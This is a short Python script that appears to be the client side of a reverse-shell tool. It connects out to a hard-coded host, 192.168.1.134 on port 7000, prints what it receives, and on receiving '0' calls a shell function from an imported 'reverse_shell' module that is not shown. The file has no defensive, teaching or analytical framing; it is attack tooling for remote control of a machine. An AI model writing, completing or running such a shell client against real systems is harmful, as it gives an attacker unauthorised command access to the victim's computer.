#!usr/bin/env python3
import socket
from modules import reverse_shell

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.134",7000))

while True:
    res = s.recv(1024)
    print(res.decode("utf-8"))
    if res == b'0':
        reverse_shell.shell()

